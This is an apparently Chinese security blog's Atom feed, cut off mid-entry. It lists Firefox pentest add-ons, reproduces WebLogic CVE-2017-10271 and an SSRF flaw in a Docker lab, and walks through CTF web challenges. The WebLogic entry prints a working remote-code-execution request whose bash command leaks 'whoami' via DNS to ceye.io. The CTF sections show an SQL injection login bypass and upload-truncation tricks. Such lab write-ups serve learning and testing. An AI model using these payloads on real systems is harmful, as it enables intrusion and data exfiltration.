<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Archimesan</title>
  
  <subtitle>思而不学则殆！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://archimesan.me/"/>
  <updated>2019-03-22T07:03:56.790Z</updated>
  <id>http://archimesan.me/</id>
  
  <author>
    <name>Archimesan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Firefox渗透插件—Web渗透必备工具</title>
    <link href="http://archimesan.me/2018/02/04/Firefox%E6%B8%97%E9%80%8F%E6%8F%92%E4%BB%B6%E2%80%94Web%E6%B8%97%E9%80%8F%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7/"/>
    <id>http://archimesan.me/2018/02/04/Firefox渗透插件—Web渗透必备工具/</id>
    <published>2018-02-04T09:13:28.000Z</published>
    <updated>2019-03-22T07:03:56.790Z</updated>
    
    <content type="html"><![CDATA[<p>工欲善必先利其器，firefox一直是各位渗透师必备的利器，我这里推荐34款firefox渗透测试辅助插件，其中包含渗透测试、信息收集、代理、加密解密等功能。</p><a id="more"></a><p><img src="1.jpg" alt></p><p>1：<font color="#FF0000"> Firebug </font> </p><p>Firefox的 五星级强力推荐插件之一，不许要多解释</p><p>2：<font color="#FF0000"> User Agent Switcher </font> </p><p>改变客户端的User Agent的一款插件</p><p>3：<font color="#FF0000"> Hackbar </font> </p><p>攻城师们的必备工具，提供了SQL注入和XSS攻击，能够快速对字符串进行各种编码。</p><p>4：<font color="#FF0000"> HttpFox </font> </p><p>监测和分析浏览器与web服务器之间的HTTP流量</p><p>5：<font color="#FF0000"> Live HTTP Headers </font> </p><p>即时查看一个网站的HTTP头</p><p>6：<font color="#FF0000"> Tamper Data </font> </p><p>查看和修改HTTP/HTTPS头和POST参数</p><p>7：<font color="#FF0000"> ShowIP </font> </p><p>在状态栏显示当前页的IP地址、主机名、ISP、国家和城市等信息。</p><p>8：<font color="#FF0000"> OSVDB </font> </p><p>开放源码的漏洞数据库检索</p><p>9: <font color="#FF0000"> Packet Storm search plugin </font> </p><p>Packet Storm提供的插件，可以搜索漏洞、工具和exploits等。</p><p>10：<font color="#FF0000"> Offsec Exploit-db Search </font> </p><p>搜索Exploit-db信息</p><p>11：<font color="#FF0000"> Security Focus Vulnerabilities Search Plugin </font> </p><p>在Security Focus上搜索漏洞</p><p>12：<font color="#FF0000"> Cookie Watcher </font> </p><p>在状态栏显示cookie</p><p>13: <font color="#FF0000"> Header Spy </font> </p><p>在状态栏显示HTTP头</p><p>14：<font color="#FF0000"> Groundspeed </font> </p><p>Manipulate the application user interface.</p><p>15：<font color="#FF0000"> CipherFox </font> </p><p>在状态栏显示当前SSL/TLS的加密算法和证书</p><p>16：<font color="#FF0000"> XSS Me </font> </p><p>XSS测试扩展</p><p>17：<font color="#FF0000"> SQL Inject Me </font> </p><p>SQL注入测试扩展</p><p>18：<font color="#FF0000"> Wappalyzer </font> </p><p>查看网站使用的应用程序</p><p>19：<font color="#FF0000"> Poster </font> </p><p>发送与Web服务器交互的HTTP请求，并查看输出结果</p><p>20：<font color="#FF0000"> Javascript Deobfuscator </font> </p><p>显示网页上运行的Javascript代码</p><p>21：<font color="#FF0000"> Modify Headers </font> </p><p>修改HTTP请求头</p><p>22：<font color="#FF0000"> FoxyProxy </font> </p><p>代理工具</p><p>23：<font color="#FF0000"> FlagFox </font> </p><p>可以在地址栏或状态栏上显示出当前网站所在国家的国旗，也有更多的其他功能，如：双击国旗可以实现WOT功能；鼠标中键点击是whois功能。当然用户可以在选项里设置快捷键实现诸如复制IP，维基百科查询等功能。</p><p>24：<font color="#FF0000"> Greasemonkey </font> </p><p>greasemonkey 使你可以向任何网页添加DHTML语句(用户脚本)来改变它们的显示方式。就像CSS可以让你接管网页的样式，而用户脚本(User Script)则可以让你轻易地控制网页设计与交互的任何方面。例如:</p><ul><li>使页面上显示的 URL 都成为可以直接点击进入的链接。 <em> 增强网页实用性，使你经常访问的网站更符合你的习惯。 </em> 绕过网站上经常出现的那些烦人的 Bug。</li></ul><p>25：<font color="#FF0000"> Domain Details </font> </p><p>显示服务器类型、IP地址、域名注册信息等</p><p>26：<font color="#FF0000"> Websecurify </font> </p><p>Websecurify是WEB安全检测软件的Firefox的扩展，可以针对Web应用进行安全评估</p><p>27：<font color="#FF0000"> XSSed Search </font> </p><p>搜索XSSed.Com跨站脚本数据库</p><p>28：<font color="#FF0000"> ViewStatePeeker </font> </p><p>查看asp.net的iewState</p><p>29：<font color="#FF0000"> CryptoFox </font> </p><p>破解MD5、加密/解密工具</p><p>30：<font color="#FF0000"> WorldIP </font> </p><p>显示服务器的IP、地址、PING、Traceroute、RDNS等信息</p><p>31：<font color="#FF0000"> Server Spy </font> </p><p>识别访问的web服务器类型，版本以及IP地址的插件</p><p>32：<font color="#FF0000"> Default Passwords </font> </p><p>搜索CIRT.net默认密码数据库。</p><p>33：<font color="#FF0000"> Snort IDS Rule Search </font> </p><p>搜索Snort的IDS规则，做签名开发的应该很有用。</p><p>34：<font color="#FF0000"> FireCAT </font> </p><p>FireCAT (Firefox Catalog of Auditing exTensions) 是一个收集最有效最有用的应用程序安全审计和风险评估工具的列表(这些工具以Firefox插件形式发布的),FireCAT中没有收集的安全工具类型包 括:fuzzer,代理和应用程序扫描器.</p><p>原文转自：<a href="http://www.91ri.org/4441.html" target="_blank" rel="noopener">http://www.91ri.org/4441.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;工欲善必先利其器，firefox一直是各位渗透师必备的利器，我这里推荐34款firefox渗透测试辅助插件，其中包含渗透测试、信息收集、代理、加密解密等功能。&lt;/p&gt;
    
    </summary>
    
    
      <category term="经验分享" scheme="http://archimesan.me/tags/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic XMLDecoder反序列化漏洞复现</title>
    <link href="http://archimesan.me/2018/02/03/WebLogic%20XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://archimesan.me/2018/02/03/WebLogic XMLDecoder 反序列化漏洞复现/</id>
    <published>2018-02-03T08:36:08.000Z</published>
    <updated>2019-03-23T14:33:39.685Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2017-10271</p><a id="more"></a><p>Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器的权限。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>  Oracle WebLogic Server 10.3.6.0.0版本</p><p>  Oracle WebLogic Server 12.1.3.0.0版本</p><p>  Oracle WebLogic Server 12.2.1.1.0版本</p><h1 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h1><h2 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br></pre></td></tr></table></figure><p>编译及启动测试环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>访问 <a href="http://127.0.0.1:7001/wls-wsat/CoordinatorPortType" target="_blank" rel="noopener">http://127.0.0.1:7001/wls-wsat/CoordinatorPortType</a></p><p><img src="1.png" alt></p><p>存在该漏洞组件</p><p>用burpsuite抓包访问</p><p>改包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.30.146:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; rv:11.0) like Gecko</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Accept-Language: zh-cn</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 646</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">&lt;java version=<span class="string">"1.8.0_131"</span> class=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span><br><span class="line">  &lt;void class=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">&lt;array class=<span class="string">"java.lang.String"</span> length=<span class="string">"3"</span>&gt;</span><br><span class="line">  &lt;void index=<span class="string">"0"</span>&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">  &lt;void index=<span class="string">"1"</span>&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">  &lt;void index=<span class="string">"2"</span>&gt;</span><br><span class="line">&lt;string&gt;ping `whoami`.ip.port.eu04a0.ceye.io&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">  &lt;void method=<span class="string">"start"</span>/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">  &lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="3.png" alt></p><p>查看ceye平台的DNS查询记录，发现服务器成功执行whoami命令并将结果拼接到ping命令中执行，用户名成功返回到DNS查询记录中：</p><p><img src="4.png" alt></p><p>ps:</p><p>使用ceye平台查看DNS查询记录<br>网站地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ceye.io/profile</span><br></pre></td></tr></table></figure></p><p><img src="2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CVE-2017-10271&lt;/p&gt;
    
    </summary>
    
    
      <category term="常见漏洞" scheme="http://archimesan.me/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>weblogic ssrf 漏洞复现</title>
    <link href="http://archimesan.me/2018/02/02/weblogic%20ssrf%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://archimesan.me/2018/02/02/weblogic ssrf 漏洞复现/</id>
    <published>2018-02-02T07:41:23.000Z</published>
    <updated>2019-03-22T07:03:56.806Z</updated>
    
    <content type="html"><![CDATA[<p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><a id="more"></a><h1 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h1><h2 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br></pre></td></tr></table></figure><p>编译及启动测试环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>访问 <a href="http://your-ip:7001/uddiexplorer/，无需登录即可查看" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/，无需登录即可查看</a> uddiexplorer 应用。</p><h1 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a>SSRF漏洞测试</h1><p>SSRF漏洞存在于 <a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在</a> brupsuite 下测试该漏洞。访问一个可以访问的 IP:PORT，如 <a href="http://127.0.0.1:80" target="_blank" rel="noopener">http://127.0.0.1:80</a></p><p>访问：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.30.146:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7000/uddi&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure></p><p><img src="1.png" alt></p><p>修改为一个不存在的端口，将会返回could not connect over HTTP to server。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.30.146:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7000/uddi&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure><p><img src="2.png" alt></p><p>通过错误的不同，即可探测内网状态。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。&lt;/p&gt;
    
    </summary>
    
    
      <category term="常见漏洞" scheme="http://archimesan.me/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>西普实验吧-web</title>
    <link href="http://archimesan.me/2018/02/01/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7-web/"/>
    <id>http://archimesan.me/2018/02/01/西普实验吧-web/</id>
    <published>2018-02-01T09:19:44.000Z</published>
    <updated>2019-03-22T07:03:56.822Z</updated>
    
    <content type="html"><![CDATA[<p>西普实验室-web题目学习</p><a id="more"></a><h2 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h2><p><img src="1-1.png" alt></p><p><img src="1-2.png" alt></p><p>用sqlmap跑一下</p><p>用户密码跑出来就行了。</p><h2 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h2><p><img src="2-1.png" alt></p><p><img src="2-2.png" alt></p><p><img src="2-3.png" alt></p><p>提交即可。</p><h2 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h2><p><img src="3-1.png" alt></p><p><img src="3-2.png" alt></p><p><img src="3-3.png" alt></p><p>总结：<br>zh-CN<br>zh-hk  小写<br>en-gb<br>.NET CLR 9.9<br>IE<br>x-forwarded-for:1.1.1.1</p><h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><p><img src="4-1.png" alt></p><p><img src="4-2.png" alt></p><p><img src="4-3.png" alt></p><h2 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h2><p><img src="5-1.png" alt></p><p><img src="5-2.png" alt></p><p><img src="5-3.png" alt></p><h2 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h2><p><img src="6-1.png" alt></p><p><img src="6-2.png" alt></p><p>普通的数字型显错注入</p><p><img src="6-3.png" alt></p><h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p><img src="7-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line">  <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure><p>hackerDJ 经过两次urlencode即可</p><p><img src="7-2.png" alt></p><h2 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h2><p><img src="8-1.png" alt></p><p><img src="8-2.png" alt></p><p>直接复制到浏览器的console运行即可</p><p><img src="8-3.png" alt></p><h2 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h2><p><img src="9-1.png" alt></p><p><img src="9-2.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">"********, "</span>*****<span class="string">", "</span>********<span class="string">");</span></span><br><span class="line"><span class="string">mysql_select_db("</span>phpformysql<span class="string">") or die("</span>Could not select database<span class="string">");</span></span><br><span class="line"><span class="string">if (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="string">die("</span>Connection failed: <span class="string">" . mysql_error(<span class="variable">$conn</span>));</span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"><span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span></span><br><span class="line"><span class="string"><span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$sql</span> = "</span>select pw from php <span class="built_in">where</span> user=<span class="string">'$user'</span><span class="string">";</span></span><br><span class="line"><span class="string"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span></span><br><span class="line"><span class="string">if (!<span class="variable">$query</span>) &#123;</span></span><br><span class="line"><span class="string">printf("</span>Error: %s\n<span class="string">", mysql_error(<span class="variable">$conn</span>));</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span></span><br><span class="line"><span class="string">//echo <span class="variable">$row</span>["</span>pw<span class="string">"];</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  if ((<span class="variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span></span><br><span class="line"><span class="string">echo "</span>&lt;p&gt;Logged <span class="keyword">in</span>! Key:************** &lt;/p&gt;<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else &#123;</span></span><br><span class="line"><span class="string">    echo("</span>&lt;p&gt;Log <span class="keyword">in</span> failure!&lt;/p&gt;<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$sql</span> = "</span>select pw from php <span class="built_in">where</span> user=<span class="string">'$user'</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>直接用户写  ‘union select md5(1)#    密码写 1  即可绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pw from php <span class="built_in">where</span> user=<span class="string">''</span> union select md5(1)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="9-3.png" alt></p><h2 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h2><p><img src="10-1.png" alt></p><p><img src="10-2.png" alt></p><p>写个逆运算即可 </p><p>python脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>.encode(<span class="string">'rot13'</span>)[::-1].decode(<span class="string">'base64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">""</span>.join([chr(ord(i)-1) <span class="keyword">for</span> i <span class="keyword">in</span> a])[::-1]</span><br></pre></td></tr></table></figure></p><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p><img src="11-1.png" alt></p><p><img src="11-2.png" alt></p><p>通过%00截断</p><p><img src="11-3.png" alt></p><h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><p><img src="12-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'name'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">      die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>md5弱类型</p><p><img src="12-2.png" alt></p><h2 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h2><p><img src="13-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'password'</span>] == <span class="variable">$_SESSION</span>[<span class="string">'password'</span>])</span><br><span class="line">        die (<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>清空cookie，password也为空</p><p><img src="13-2.png" alt></p><h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><p><img src="14-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== FALSE)</span><br><span class="line">&#123;</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="14-2.png" alt></p><h2 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h2><p><img src="15-1.png" alt></p><p><img src="15-2.png" alt></p><p>查看源代码发现</p><p><img src="15-3.png" alt></p><p><img src="15-4.png" alt></p><p><img src="15-5.png" alt></p><p>因为是vim 考虑源码泄露 尝试 .submit.php.swp</p><p><img src="15-6.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 